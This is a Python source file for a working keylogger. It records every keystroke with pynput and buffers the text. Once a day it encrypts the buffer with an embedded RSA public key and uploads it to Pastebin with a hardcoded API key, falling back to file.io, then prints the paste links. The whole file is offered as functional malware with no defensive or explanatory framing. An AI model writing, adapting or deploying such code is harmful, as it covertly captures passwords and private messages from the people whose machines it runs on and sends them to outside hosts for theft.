from math import ceil
from time import sleep
from requests import post
from base64 import b64decode
from urllib.parse import urlencode
from pynput.keyboard import Listener
from urllib.request import urlopen, Request

from apscheduler.schedulers.blocking import BlockingScheduler
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

class PastebinError(Exception):
    pass

class PastebinRequestError(PastebinError):
    pass

PASTEBIN_API_VERSION = '3.1'

__API_LOGIN_URL = 'https://pastebin.com/api/api_login.php'
__API_POST_URL = 'https://pastebin.com/api/api_post.php'

# We have 3 valid values available which you can use with the 'api_paste_private' parameter:
__PRIVATE_VARIANTS = {
    'public': 0,
    'unlisted': 1,
    'private': 2
}

def __send_post_request_by_pastebin(url: str, params: dict) -> str:
    """
    :param url:
    :param params:
    :return:
    """
    params = {
        k: v
        for k, v in params.items()
        if v
    }
    params = urlencode(params).encode('utf-8')

    # POST request
    req = Request(url, data=params)

    with urlopen(req) as f:
        if f.getcode() != 200:
            raise PastebinRequestError('HTTP status code: ' + str(f.getcode()))

        rs = f.read().decode("utf-8")

        if rs.startswith('Bad API request'):
            raise PastebinRequestError(rs)

        return rs


def __send_api_post_request(params: dict) -> str:
    return __send_post_request_by_pastebin(__API_POST_URL, params)

def paste(
        dev_key: str,
        code: str,
        user_key: str = None,
        name: str = None,
        format: str = None,
        private: str = None,
        expire_date: str = "10M"
) -> str:
    """ Creating A New Paste
    :param dev_key:
    :param code:
    :param user_key:
    :param name:
    :param format:
    :param private:
    :param expire_date:
    :return:
    """

    if private:
        private = __PRIVATE_VARIANTS.get(private.lower())

        if private == 2 and not user_key:
            raise PastebinError('Private paste only allowed in combination with api_user_key, '
                                'as you have to be logged into your account to access the paste')

    params = {
        'api_dev_key': dev_key,
        'api_option': 'paste',
        'api_paste_code': code,

        'api_user_key': user_key,
        'api_paste_name': name,
        'api_paste_format': format,
        'api_paste_private': private,
        'api_paste_expire_date': expire_date,
    }
    return __send_api_post_request(params)

msg = ''

def on_press(key):
    global msg
    k = str(key).replace("'", "")
    if k == 'Key.enter':
        msg += "[ENTER]\n"
    elif k == 'Key.backspace':
        msg = msg[:-1] 
    elif k.startswith('Key.shift'):
        msg += '[SHFT]'
    elif k == 'Key.delete':
        msg += '[DEL]'
    elif k == 'Key.space':
        msg += ' '
    elif k.startswith('Key.alt'):
        msg += '[ALT]'
    elif k.startswith('Key.ctrl'):
        msg += '[CTRL]'
    else:
        msg += k

def upload():
    global msg
    toBeEncrypted = bytes(msg.encode())
    public_key_data = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9Q1LWfwpLIc0/sflB/MZHEZM9fL4MGyqSleMNaKeGvEZictQqojDJvFo3TbgVUPY65tkMd885kg+JsdzXu48qcWpIgbsKtxm52YYa9z1km/T8IPmULFQHnqS75+jPeWRq4hKqm8PjWSluLIqjy7Ao0F0rfVeM3WL6K1jhELq3MpYvgBVeWX6UbzUpT++sqkwlJGcSgvWPhh7ENn3CO+tXPVGJIYqO2RdTck0MY91fzciQf1Bbm6nRGPri48fcP/ZR315oJ6Lile+P4sNmO3J1V1HTXp4ShVmq1F3NT+p9wcNp44mBF+ld0Nz6kmFpKB74PpVraYtKcjTzY4by/qmvwIDAQAB"
    
    public_key = serialization.load_der_public_key(b64decode(public_key_data),backend=default_backend())
    encrypt_list = list()
    lenofMessage = len(toBeEncrypted) 
    loop_times = ceil(lenofMessage/128) 
    upperIndex = min(lenofMessage,127) 
    lowerIndex = 0 
    while loop_times > 0 : 
        encrypted = public_key.encrypt(
		toBeEncrypted[lowerIndex:upperIndex],
		padding.OAEP(
		    mgf=padding.MGF1(algorithm=hashes.SHA256()),
		    algorithm=hashes.SHA256(),
		    label=None
		)
	)
        loop_times-=1 
        lenofMessage-=127
        lowerIndex+=127
        upperIndex+=min(max(lenofMessage,0),127) 
        encrypt_list.append(encrypted)
    urls_list = list()
    
    try:
        for data in encrypt_list:
            dev_key = "2lTrhrXVkkGTuN1CKqS_j1_HgpoQ9ZRV"
            rs = paste(dev_key, data)
            urls_list.append(rs) 
            sleep(2) 
    

    except:
        try:
            for data in encrypt_list:
                url = 'https://file.io'
                data = {"file": data}
                response = post(url, files=data)
                res = response.json()
                urls_list.append(res["link"])
                sleep(2)
        except:
            pass
              
    for url in urls_list:
        print(url)
    msg = ''


if __name__ == '__main__':
    listener = Listener(on_press=on_press)
    listener.start()
    scheduler = BlockingScheduler()
    scheduler.add_job(upload, 'interval', hours=24) #minutes=1 to test
    scheduler.start()
    
